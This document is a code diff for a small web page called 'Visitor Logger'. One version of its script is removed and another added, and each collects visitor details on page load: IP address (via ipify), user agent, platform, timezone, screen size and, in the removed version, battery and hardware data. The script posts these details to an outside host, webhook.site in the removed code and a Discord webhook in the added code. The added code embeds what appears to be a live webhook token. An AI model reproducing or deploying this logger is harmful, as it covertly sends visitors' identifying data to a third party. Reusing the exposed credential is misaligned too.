@@ -1,83 +1,57 @@
-<script>
-async function logVisitor() {
-  const userAgent = navigator.userAgent;
-  const language = navigator.language;
-  const screenSize = `${screen.width}x${screen.height}`;
-  const windowSize = `${window.innerWidth}x${window.innerHeight}`;
-  const referrer = document.referrer || '';
-  const url = location.href;
-  const platform = navigator.platform;
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  const localTime = new Date().toString();
-  const date = new Date().toISOString();
-  const isMobile = /Mobi|Android|iPhone|iPad/i.test(userAgent) ? 'Mobile' : 'Desktop';
-  const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
-  const cookieEnabled = navigator.cookieEnabled;
-  const cores = navigator.hardwareConcurrency || 'unknown';
-  const ram = navigator.deviceMemory || 'unknown';
-  const online = navigator.onLine;
-  const colorDepth = screen.colorDepth || 'unknown';
-  const connection = navigator.connection ? navigator.connection.effectiveType : 'unknown';
-  const touchSupport = 'ontouchstart' in window;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Visitor Logger</title>
+</head>
+<body>
+  <h1>Visitor Logger Active</h1>
 
-  // Battery
-  let batteryLevel = 'unsupported';
-  try {
-    const battery = await navigator.getBattery();
-    batteryLevel = Math.round(battery.level * 100) + '%';
-  } catch (e) {}
+  <script>
+  (async () => {
+    const webhookURL = "https://discord.com/api/webhooks/1395279513491079350/suo8tCqbxAo_hAWAcH0kiCw0cqEXqG6FCkzCS5wwxuQL1R6csw3LFl2TwpwHlkUVzlNc";
 
-  // Browser detection
-  let browser = 'Unknown';
-  if (userAgent.includes("Chrome") && !userAgent.includes("Edge")) browser = 'Chrome';
-  else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = 'Safari';
-  else if (userAgent.includes("Firefox")) browser = 'Firefox';
-  else if (userAgent.includes("Edg")) browser = 'Edge';
-  else if (userAgent.includes("OPR") || userAgent.includes("Opera")) browser = 'Opera';
+    const data = {
+      ip: 'unknown',
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      screenSize: `${screen.width}x${screen.height}`,
+      url: location.href,
+      platform: navigator.platform,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      localTime: new Date().toString(),
+      deviceType: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+    };
 
-  // IP
-  let ip = 'unknown';
-  try {
-    const res = await fetch('https://api.ipify.org?format=json');
-    const json = await res.json();
-    ip = json.ip;
-  } catch (e) {}
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const json = await res.json();
+      data.ip = json.ip;
+    } catch {}
 
-  const data = {
-    ip,
-    date,
-    localTime,
-    language,
-    platform,
-    browser,
-    deviceType: isMobile,
-    screenSize,
-    windowSize,
-    colorDepth,
-    referrer,
-    url,
-    timezone,
-    batteryLevel,
-    darkMode,
-    cookieEnabled,
-    connection,
-    touchSupport,
-    online,
-    hardwareCores: cores,
-    ramGB: ram,
-    userAgent
-  };
+    const message = `
+**New Visitor Logged:**
+- IP: ${data.ip}
+- Device: ${data.deviceType}
+- Platform: ${data.platform}
+- Browser: ${data.userAgent}
+- Language: ${data.language}
+- Screen Size: ${data.screenSize}
+- URL: ${data.url}
+- Timezone: ${data.timezone}
+- Local Time: ${data.localTime}
+`;
 
-  try {
-    await fetch('https://webhook.site/4e5facef-8227-498e-9970-31d80913e906', {
-      method: 'POST',
-      body: JSON.stringify(data),
-      headers: { 'Content-Type': 'application/json' }
-    });
-  } catch (e) {
-    console.error('Log failed', e);
-  }
-}
-
-logVisitor();
-</script>
+    try {
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: message })
+      });
+    } catch (err) {
+      console.error('Failed to send Discord message', err);
+    }
+  })();
+  </script>
+</body>
+</html>
